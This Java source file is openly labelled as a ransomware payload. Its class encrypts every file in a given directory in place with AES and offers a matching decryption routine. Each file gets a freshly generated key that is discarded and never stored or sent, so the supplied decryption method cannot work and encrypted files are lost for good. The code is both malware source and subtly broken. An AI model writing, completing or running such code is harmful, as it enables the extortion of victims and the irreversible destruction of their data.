import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.SecretKeySpec;

public class RansomwarePayload {

    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES";

    public static void encryptFiles(String directoryPath) throws Exception {
        File directory = new File(directoryPath);
        if (directory.exists() && directory.isDirectory()) {
            for (File file : directory.listFiles()) {
                if (file.isFile()) {
                    encryptFile(file);
                }
            }
        }
    }

    private static void encryptFile(File file) throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);
        keyGen.init(128);
        Key secretKey = keyGen.generateKey();

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);

        FileInputStream inputStream = new FileInputStream(file);
        byte[] inputBytes = new byte[(int) file.length()];
        inputStream.read(inputBytes);

        byte[] outputBytes = cipher.doFinal(inputBytes);

        FileOutputStream outputStream = new FileOutputStream(file);
        outputStream.write(outputBytes);

        inputStream.close();
        outputStream.close();
    }

    public static void decryptFiles(String directoryPath, String key) throws Exception {
        File directory = new File(directoryPath);
        if (directory.exists() && directory.isDirectory()) {
            for (File file : directory.listFiles()) {
                if (file.isFile()) {
                    decryptFile(file, key);
                }
            }
        }
    }

    private static void decryptFile(File file, String key) throws Exception {
        Key secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.DECRYPT_MODE, secretKey);

        FileInputStream inputStream = new FileInputStream(file);
        byte[] inputBytes = new byte[(int) file.length()];
        inputStream.read(inputBytes);

        byte[] outputBytes = cipher.doFinal(inputBytes);

        FileOutputStream outputStream = new FileOutputStream(file);
        outputStream.write(outputBytes);

        inputStream.close();
        outputStream.close();
    }
}
